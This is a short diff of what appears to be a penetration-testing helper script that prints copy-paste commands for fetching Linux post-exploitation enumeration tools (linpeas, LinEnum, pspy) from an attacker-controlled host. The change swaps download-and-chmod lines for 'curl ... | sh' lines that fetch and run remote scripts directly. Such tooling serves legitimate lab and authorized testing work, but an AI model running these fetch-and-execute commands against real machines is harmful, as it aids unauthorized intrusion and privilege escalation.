@@ -24,8 +24,8 @@ fi
 echo -e "${Frame}###${End} http://$ip ${Frame}###${End}\n"
 
 echo -e "${Frame}###${End} ${Title}Linux Post Enum Scripts${End} ${Frame}###${End}"
-echo -e "${Point} wget http://$ip/linpeas.sh -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh"
-echo -e "${Point} wget http://$ip/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh"
+echo -e "${Point} curl http://$ip/linpeas.sh | sh"
+echo -e "${Point} curl http://$ip/LinEnum.sh | sh"
 echo -e "${Point} wget http://$ip/pspy32 -O /tmp/pspy32; chmod +x /tmp/pspy32"
 echo -e "${Point} wget http://$ip/pspy64 -O /tmp/pspy64; chmod +x /tmp/pspy64"
 echo -e ""
